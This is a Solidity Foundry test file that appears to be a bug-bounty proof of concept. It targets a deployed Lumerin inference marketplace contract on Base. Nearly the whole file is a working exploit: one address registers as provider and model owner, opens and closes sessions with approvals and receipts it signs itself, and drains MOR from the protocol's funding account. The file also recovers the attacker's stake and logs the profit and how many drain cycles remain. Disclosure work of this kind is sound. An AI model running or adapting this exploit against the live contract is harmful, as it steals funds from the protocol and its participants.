// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console2} from "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

interface IDiamond {
    function providerRegister(address provider_, uint256 amount_, string calldata endpoint_) external;
    function getProviderMinimumStake() external view returns (uint256);
    function modelRegister(address modelOwner_, bytes32 baseModelId_, bytes32 ipfsCID_, uint256 fee_, uint256 amount_, string calldata name_, string[] calldata tags_) external;
    function getModelMinimumStake() external view returns (uint256);
    function getModelId(address account_, bytes32 baseModelId_) external pure returns (bytes32);
    function postModelBid(address provider_, bytes32 modelId_, uint256 pricePerSecond_) external returns (bytes32);
    function getMinMaxBidPricePerSecond() external view returns (uint256, uint256);
    function openSession(address user_, uint256 amount_, bool isDirectPaymentFromUser_, bytes calldata approvalEncoded_, bytes calldata signature_) external returns (bytes32);
    function closeSession(bytes calldata receiptEncoded_, bytes calldata signature_) external;
    function getSessionEnd(uint256 amount_, uint256 pricePerSecond_, uint128 openedAt_) external view returns (uint128);
    function stakeToStipend(uint256 amount_, uint128 timestamp_) external view returns (uint256);
    function stipendToStake(uint256 stipend_, uint128 timestamp_) external view returns (uint256);
    function withdrawUserStakes(address user_, uint8 iterations_) external;
    function getUserStakesOnHold(address user_, uint8 iterations_) external view returns (uint256 available_, uint256 hold_);
}

/**
 * Morpheus Lumerin inference marketplace (Base) local-fork PoC
 *
 * TARGET: LumerinDiamond 0x6aBE1d282f72B474E54527D93b979A4f64d3030a (EIP-2535)
 * facets (in scope through the diamond): ProviderRegistry / ModelRegistry /
 * Marketplace / SessionRouter (SessionRouter = 0x3a3952F0e57B343F00B31f7da039Ef16389B7260).
 *
 * FINDING: one unprivileged address can act as BOTH consumer and provider,
 * fabricate sessions with self-signed approvals/receipts, and collect MOR from
 * the protocol `fundingAccount` (compute budget) without serving any inference.
 * The user-side session stake is fully recoverable (day-hold recycle), so the
 * extraction needs no collateral beyond a ~1-day hold. Per session the attacker
 * extracts `stakeToStipend(stake)` ~= 0.292% of the recycled stake; the only
 * throttle is PROVIDER_REWARD_LIMITER_PERIOD (365d) capping claims at
 * `provider.stake` per year (i.e. ~100% APR conversion of MOR stake into
 * treasury drain).
 */
contract LumerinSessionPoC is Test {
    address constant DIAMOND = 0x6aBE1d282f72B474E54527D93b979A4f64d3030a;
    address constant MOR = 0x7431aDa8a591C955a994a21710752EF9b882b8e3;
    address constant FUNDING_ACCOUNT = 0x5160C0311A95E0A1072FA85Df23712A7BA1cD4b1;

    uint256 constant ATTACKER_PK = 0xA11CE;

    function setUp() public {
        vm.createSelectFork(vm.envString("BASE_RPC_URL"), 53_383_498);
    }

    function test_PoC_FabricatedSession_DrainsFundingAccount() public {
        address attacker = vm.addr(ATTACKER_PK);
        IDiamond d = IDiamond(DIAMOND);

        uint256 startBal = IERC20(MOR).balanceOf(attacker);
        uint256 fundingBefore = IERC20(MOR).balanceOf(FUNDING_ACCOUNT);

        // ---- capital: 10k MOR provider stake + 10k MOR session stake (recycled) ----
        uint256 providerStake = 10_000 ether;
        uint256 userStake = 10_000 ether;
        uint256 modelStake = d.getModelMinimumStake();
        deal(MOR, attacker, providerStake + userStake + modelStake + 1 ether);

        vm.startPrank(attacker);
        IERC20(MOR).approve(DIAMOND, type(uint256).max);

        // 1. become provider AND model owner (permissionless, stake-gated)
        d.providerRegister(attacker, providerStake, "wss://attacker");
        bytes32 baseModelId = keccak256("model");
        string[] memory tags = new string[](1);
        tags[0] = "llm";
        d.modelRegister(attacker, baseModelId, keccak256("ipfs"), 0, d.getModelMinimumStake(), "attacker-model", tags);
        bytes32 modelId = d.getModelId(attacker, baseModelId);

        // 2. bid for own model; price chosen so the session lasts ~1h
        uint128 nowTs = uint128(block.timestamp);
        uint256 stipendFor1h = d.stakeToStipend(userStake, nowTs); // full-stake stipend
        uint256 pricePerSecond = stipendFor1h / 3600;
        (uint256 minP, uint256 maxP) = d.getMinMaxBidPricePerSecond();
        if (pricePerSecond < minP) pricePerSecond = minP;
        if (pricePerSecond > maxP) pricePerSecond = maxP;
        bytes32 bidId = d.postModelBid(attacker, modelId, pricePerSecond);
        vm.stopPrank();

        // 3. open session with ITSELF (provider signs its own approval)
        bytes memory approval = abi.encode(bidId, block.chainid, attacker, nowTs);
        vm.prank(attacker);
        bytes32 sessionId = d.openSession(attacker, userStake, false, approval, _sign(approval));
        console2.logBytes32(sessionId);

        uint128 endsAt = d.getSessionEnd(userStake, pricePerSecond, nowTs);
        console2.log("session duration (s):", uint256(endsAt) - uint256(nowTs));
        console2.log("user stake locked (MOR):", userStake);

        // 4. close with self-signed receipt right after the session ends
        vm.warp(uint256(endsAt) + 30 minutes);
        bytes memory receipt = abi.encode(sessionId, block.chainid, uint128(block.timestamp), uint32(1000), uint32(50));
        uint256 attackerBeforeClose = IERC20(MOR).balanceOf(attacker);
        uint256 fundingBeforeClose = IERC20(MOR).balanceOf(FUNDING_ACCOUNT);
        vm.prank(attacker);
        d.closeSession(receipt, _sign(receipt));

        uint256 payment = IERC20(MOR).balanceOf(attacker) - attackerBeforeClose;
        uint256 stolen = fundingBeforeClose - IERC20(MOR).balanceOf(FUNDING_ACCOUNT);
        console2.log("MOR paid by fundingAccount to fabricated provider:", payment);
        console2.log("of which user-stake recycle at close:", payment - stolen);
        console2.log("TREASURY THEFT (provider payment):", stolen);

        assertGt(stolen, 0, "fundingAccount pays out on a fabricated session");

        // 5. day-hold recycle: recover the full session stake
        (uint256 available,) = d.getUserStakesOnHold(attacker, 255);
        uint256 releaseAt = (uint256(endsAt) / 1 days + 1) * 1 days + 1;
        vm.warp(releaseAt);
        vm.prank(attacker);
        d.withdrawUserStakes(attacker, 255);
        console2.log("on-hold stake recycled (MOR):", available);

        uint256 endBal = IERC20(MOR).balanceOf(attacker);
        console2.log("attacker net profit (MOR):", endBal - startBal);

        // ---- ASSERT THE LOSS ----
        // the attacker's stake comes back in full; the profit is exactly the theft
        uint256 dealt = providerStake + userStake + modelStake + 1 ether;
        assertApproxEqAbs(endBal, dealt - providerStake - modelStake + stolen, 1 ether, "stake recovered; profit == theft");
        assertEq(fundingBefore - IERC20(MOR).balanceOf(FUNDING_ACCOUNT), stolen, "loss borne by fundingAccount");

        // annualized extraction on recycled stake (cap: PROVIDER_REWARD_LIMITER_PERIOD)
        console2.log("profit per cycle / recycled stake (bps):", stolen * 10000 / userStake);
        console2.log("fundingAccount drainable cycles remaining:", fundingBefore / stolen);
    }

    function _sign(bytes memory data) internal pure returns (bytes memory) {
        bytes32 digest = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", keccak256(data)));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(ATTACKER_PK, digest);
        return abi.encodePacked(r, s, v);
    }
}
